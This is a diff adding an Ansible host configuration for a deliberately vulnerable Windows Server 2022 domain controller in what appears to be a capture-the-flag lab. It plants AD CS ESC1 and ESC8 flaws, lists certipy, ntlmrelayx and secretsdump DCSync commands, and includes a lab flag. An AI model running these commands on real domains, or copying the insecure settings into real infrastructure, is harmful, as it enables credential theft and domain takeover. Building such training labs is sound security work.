@@ -1,0 +1,119 @@
+---
+# =============================================================================
+# DC01-WIN2022 - Domain Controller
+# =============================================================================
+# Role:        Primary Domain Controller for corp.local + AD CS
+# OS:          Windows Server 2022
+# Network:     Internal (172.16.50.10)
+# Attack Path: Phase D, Step 10 (Domain Domination - Final Target)
+# =============================================================================
+
+hostname: DC01
+machine_role: domain_controller
+attack_phase: "D10"
+attack_name: "Certificate Abuse & DCSync"
+
+# Network
+ansible_host: 172.16.50.10
+ansible_connection: winrm
+ansible_winrm_transport: ntlm
+ansible_winrm_server_cert_validation: ignore
+ansible_port: 5986
+ansible_winrm_scheme: https
+network_segment: internal
+gateway: 172.16.50.1
+
+# OS
+os_family: windows
+os_version: "Windows Server 2022"
+
+# Domain role
+is_domain_controller: true
+domain_name: "corp.local"
+domain_netbios: "CORP"
+dns_role: primary
+
+# Services
+services:
+  - name: NTDS
+    port: 389
+    protocol: tcp
+    description: "Active Directory Domain Services"
+  - name: DNS
+    port: 53
+    protocol: tcp
+    description: "DNS Server"
+  - name: Kerberos
+    port: 88
+    protocol: tcp
+    description: "Kerberos KDC"
+  - name: ADCS
+    port: 443
+    protocol: tcp
+    description: "AD Certificate Services Web Enrollment"
+  - name: LDAPS
+    port: 636
+    protocol: tcp
+    description: "LDAP over SSL"
+  - name: RPC
+    port: 135
+    protocol: tcp
+    description: "RPC Endpoint Mapper"
+  - name: SMB
+    port: 445
+    protocol: tcp
+    description: "SMB/CIFS"
+
+# Windows Features to install
+windows_features:
+  - AD-Domain-Services
+  - DNS
+  - RSAT-AD-Tools
+  - RSAT-DNS-Server
+  - GPMC
+  - Adcs-Cert-Authority
+  - Adcs-Web-Enrollment
+  - Adcs-Enroll-Web-Svc
+
+# AD Certificate Services
+adcs:
+  ca_name: "CORP-CA"
+  ca_type: "EnterpriseRootCA"
+  key_length: 2048
+  hash_algorithm: "SHA256"
+  validity_years: 10
+
+# Vulnerabilities
+vulnerabilities:
+  esc1:
+    type: "ADCS ESC1 - Enrollee Supplies Subject"
+    template_name: "CorpWebServer"
+    vector: "Domain Users can request certs with arbitrary SAN"
+    severity: critical
+    cvss: 9.1
+    exploit: "certipy req -template CorpWebServer -upn administrator@corp.local"
+  esc8:
+    type: "ADCS ESC8 - NTLM Relay to Web Enrollment"
+    vector: "HTTP enrollment endpoint accepts NTLM without EPA"
+    severity: critical
+    cvss: 8.8
+    endpoint: "http://DC01.corp.local/certsrv/"
+    exploit: "ntlmrelayx.py -t http://DC01/certsrv/certfnsh.asp --adcs"
+  dcsync:
+    type: "DCSync"
+    vector: "Domain Admin can replicate directory changes (NTDS.dit)"
+    severity: critical
+    exploit: "secretsdump.py corp.local/administrator@172.16.50.10 -just-dc-ntlm"
+
+# CTF Flags
+flags:
+  root:
+    value: "black0ps{d0m41n_4dm1n_dcsync}"
+    path: 'C:\Users\Administrator\Desktop\root.txt'
+    owner: Administrator
+    permissions: "admin_only"
+
+# Resource allocation
+vm_memory: 4096
+vm_cpus: 2
+vm_gui: true
